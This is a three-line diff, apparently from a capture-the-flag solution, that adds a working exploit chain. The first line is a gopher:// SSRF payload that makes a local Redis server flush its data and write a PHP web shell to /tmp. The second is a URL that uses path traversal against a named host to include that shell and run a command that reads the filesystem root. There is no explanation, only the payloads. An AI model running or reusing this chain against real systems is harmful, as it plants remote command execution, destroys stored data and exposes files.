@@ -1,0 +1,3 @@
+gopher:///127.0.0.1:27134/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2ftmp%2f%0D%0ACONFIG%20SET%20DBFILENAME%20fuxsocy.inc.php%0D%0ASAVE%0D%0AQUIT
+
+http://base64image.splitline.tw:8894/?page=....//....//....//....//tmp/fuxsocy&cmd=cat%20/*
